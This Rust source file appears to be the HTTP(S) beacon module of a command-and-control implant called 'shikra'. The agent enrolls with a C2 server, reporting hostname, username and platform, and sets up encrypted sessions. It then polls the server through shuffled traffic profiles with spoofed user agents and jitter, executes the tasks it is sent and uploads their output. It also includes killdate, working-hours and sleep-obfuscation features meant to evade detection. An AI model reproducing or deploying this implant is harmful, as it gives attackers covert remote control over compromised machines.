use anyhow::{Context, Result};
use prost::Message;
use shikra_crypto::channel::SessionKeys;
use shikra_crypto::kex::KeyPair;
use shikra_crypto::signing::{verify, Identity};
use shikra_proto::v1::{
    agent_message, AgentMessage, AgentResult, Architecture, CheckInRequest, CheckInResponse,
    Platform, SessionKind,
};
use shikra_transport::profile::ProfileSet;
use shikra_transport::wire;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;

#[derive(Debug, Clone)]
pub struct BeaconConfig {
    pub base_url: String,
    pub ca_pem: Option<String>,
    pub server_identity: [u8; 32],
    pub enroll_token: String,
    pub profiles: ProfileSet,
    pub max_runtime_secs: Option<u64>,
}

/// HTTP(S) beacon loop: enroll once, then poll on the profile schedule,
/// upload results and execute queued tasks.
pub async fn run_beacon(config: BeaconConfig) -> Result<()> {
    run_beacon_notify(config, None).await
}

/// Like [`run_beacon`], but signals `ready` after successful enrollment so a
/// fallback chain can commit to this transport.
pub async fn run_beacon_notify(
    config: BeaconConfig,
    ready: Option<tokio::sync::oneshot::Sender<()>>,
) -> Result<()> {
    use crate::{execute_task, AgentState};
    if config.profiles.is_empty() {
        anyhow::bail!("beacon configuration has no C2 profiles");
    }
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .context("failed to build HTTP client")?;

    let mut cycle = config.profiles.shuffled_cycle();
    let mut cursor = cycle.len();
    let enroll_profile = config
        .profiles
        .iter()
        .next()
        .expect("non-empty profile set");
    let enroll_url = join_url(&config.base_url, &enroll_profile.enroll_uri);

    let identity = Identity::generate();
    let kex = KeyPair::generate();
    let kex_public = kex.public_key();
    let signature = identity.sign(&wire::enroll_message(&kex_public));

    let checkin = CheckInRequest {
        identity_public: identity.public_key_bytes().to_vec(),
        kex_public: kex_public.to_vec(),
        identity_signature: signature.to_bytes().to_vec(),
        hostname: crate::hostname(),
        username: crate::username(),
        platform: current_platform(),
        architecture: current_architecture(),
        process_name: std::env::current_exe()
            .ok()
            .and_then(|path| path.file_name().map(|n| n.to_string_lossy().to_string()))
            .unwrap_or_default(),
        kind: SessionKind::Beacon as i32,
        enrollment_token: config.enroll_token.clone(),
        killdate_unix: crate::limits::get().killdate_unix,
        working_hours: crate::limits::get().working_hours.clone(),
    };

    let mut request = client
        .post(&enroll_url)
        .header(reqwest::header::USER_AGENT, &enroll_profile.user_agent)
        .body(checkin.encode_to_vec());
    for (name, value) in &enroll_profile.request_headers {
        request = request.header(name, value);
    }
    let response = request.send().await.context("beacon enroll failed")?;
    if !response.status().is_success() {
        anyhow::bail!("beacon enroll rejected: HTTP {}", response.status());
    }
    let body = response.bytes().await.context("enroll body read failed")?;
    let checkin_response =
        CheckInResponse::decode(body.as_ref()).context("invalid enroll response")?;

    let server_kex_public: [u8; 32] = checkin_response
        .server_kex_public
        .as_slice()
        .try_into()
        .map_err(|_| anyhow::anyhow!("server kex public key has wrong length"))?;

    verify(
        &config.server_identity,
        &wire::checkin_response_message(
            &checkin_response.session_id,
            &kex_public,
            &server_kex_public,
        ),
        &checkin_response.server_signature,
    )
    .context("server identity verification failed")?;

    let shared = kex.diffie_hellman(&server_kex_public);
    let keys = SessionKeys::derive(&checkin_response.session_id, &shared, true)
        .context("session key derivation failed")?;

    tracing::info!(
        session = %checkin_response.session_id,
        profiles = config.profiles.len(),
        "beacon checked in"
    );
    if let Some(ready) = ready {
        let _ = ready.send(());
    }

    let state = Arc::new(Mutex::new(keys));
    let mut agent_state = AgentState::default();
    let mut pending_results = crate::MaskedResults::new();
    let deadline = config
        .max_runtime_secs
        .map(|secs| tokio::time::Instant::now() + Duration::from_secs(secs));

    loop {
        if crate::limits::killdate_expired() {
            tracing::info!("killdate reached; exiting");
            std::process::exit(0);
        }
        if crate::limits::outside_working_hours() {
            tokio::time::sleep(Duration::from_secs(60)).await;
            continue;
        }
        if let Some(deadline) = deadline {
            if tokio::time::Instant::now() >= deadline {
                tracing::info!("max runtime reached");
                break;
            }
        }

        let message = match pending_results.take_batch() {
            Some(batch) => AgentMessage {
                body: Some(agent_message::Body::Results(batch)),
            },
            None => AgentMessage {
                body: Some(agent_message::Body::Heartbeat(
                    shikra_proto::v1::AgentHeartbeat {
                        unix_ms: crate::current_unix_ms(),
                    },
                )),
            },
        };

        let envelope = {
            let mut keys = state.lock().await;
            wire::seal_message(&mut keys, &message).context("beacon seal failed")?
        };

        if cursor >= cycle.len() {
            cycle = config.profiles.shuffled_cycle();
            cursor = 0;
        }
        let profile = &config.profiles.profiles[cycle[cursor]];
        cursor += 1;
        let poll_url = join_url(&config.base_url, &profile.poll_uri);
        let mut request = client
            .post(&poll_url)
            .header(reqwest::header::USER_AGENT, &profile.user_agent)
            .body(wire::encode_envelope(&envelope).context("envelope encode failed")?);
        for (name, value) in &profile.request_headers {
            request = request.header(name, value);
        }

        match request.send().await {
            Ok(response) if response.status().is_success() => {
                let body = response.bytes().await.context("poll body read failed")?;
                let reply = wire::decode_envelope(&body).context("invalid poll envelope")?;
                let opened = {
                    let mut keys = state.lock().await;
                    wire::open_message(&mut keys, &reply).context("poll envelope rejected")?
                };

                if let Some(agent_message::Body::Tasks(batch)) = opened.body {
                    for task in batch.tasks {
                        let task_id = task.task_id.clone();
                        let outcome = execute_task(&mut agent_state, &task, None).await;
                        tracing::info!(task = %task_id, kind = %task.kind, code = outcome.exit_code, "beacon task executed");
                        pending_results.push(AgentResult {
                            task_id,
                            exit_code: outcome.exit_code,
                            stdout: outcome.stdout,
                            stderr: outcome.stderr.into_bytes(),
                        });
                    }
                }
            }
            Ok(response) => {
                tracing::warn!(status = %response.status(), "beacon poll rejected");
            }
            Err(err) => {
                tracing::warn!(%err, "beacon poll failed");
            }
        }

        // Reuse the last profile for pacing so the schedule stays stable.
        let profile = &config.profiles.profiles[cycle[(cursor - 1) % cycle.len()]];
        let jitter = if profile.jitter_secs > 0 {
            rand::random::<u64>() % profile.jitter_secs
        } else {
            0
        };
        let sleep_for = Duration::from_secs(profile.poll_interval_secs.max(1) + jitter);
        crate::sleep_obfuscated(sleep_for).await;
    }

    Ok(())
}

fn join_url(base: &str, path: &str) -> String {
    format!(
        "{}/{}",
        base.trim_end_matches('/'),
        path.trim_start_matches('/')
    )
}

fn current_platform() -> i32 {
    if cfg!(target_os = "windows") {
        Platform::Windows as i32
    } else if cfg!(target_os = "macos") {
        Platform::Macos as i32
    } else {
        Platform::Linux as i32
    }
}

fn current_architecture() -> i32 {
    if cfg!(target_arch = "aarch64") {
        Architecture::Aarch64 as i32
    } else {
        Architecture::X8664 as i32
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn url_join_handles_slashes() {
        assert_eq!(join_url("http://x:1", "/a/b"), "http://x:1/a/b");
        assert_eq!(join_url("http://x:1/", "a/b"), "http://x:1/a/b");
    }
}
